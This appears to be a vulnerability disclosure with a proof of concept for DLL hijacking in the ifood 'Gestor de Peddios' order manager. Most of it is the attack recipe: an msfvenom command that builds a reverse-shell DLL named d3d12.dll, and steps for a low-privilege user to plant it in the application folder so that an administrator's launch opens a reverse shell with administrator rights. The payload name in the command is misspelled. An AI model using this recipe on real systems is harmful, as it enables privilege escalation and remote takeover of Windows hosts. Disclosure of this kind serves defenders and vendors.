# ifood Order Manager  'Gestor de Peddios.exe' - DLL hijacking

An attacker places a malicious DLL named "d3d12.dll" in a directory that is searched by the application before the legitimate "d3d12.dll" is found. When the application is launched, it loads the malicious DLL instead of the legitimate one, allowing the attacker to execute arbitrary code in the context of the application.

Vendor Homepage: https://gestordepedidos.ifood.com.br/

Google Drive: https://drive.google.com/file/d/1p5SavlbLAE2o59l8jj4j-FkE_Ne_0Y-P/view?usp=sharing

POC video: https://youtu.be/oMIobV2M0T8


# POC

1. Create malicious dll file on kali linux with msfvenom

       msfvenom -p windows/x64/shell_revese_tcp LHOST=<IP> LPORT=<PORT> -f dll -o d3d12.dll
2.  Transfer created 'd3d12.dll' to the Windows Host from Kali as low level user access
3.  Move the created 'd3d12.dll' file to the 'C:\Gestor de Peddios\d3d12.dll' as low level user access
4.  When Administrator run the application,you will get reverse shell as administrator 


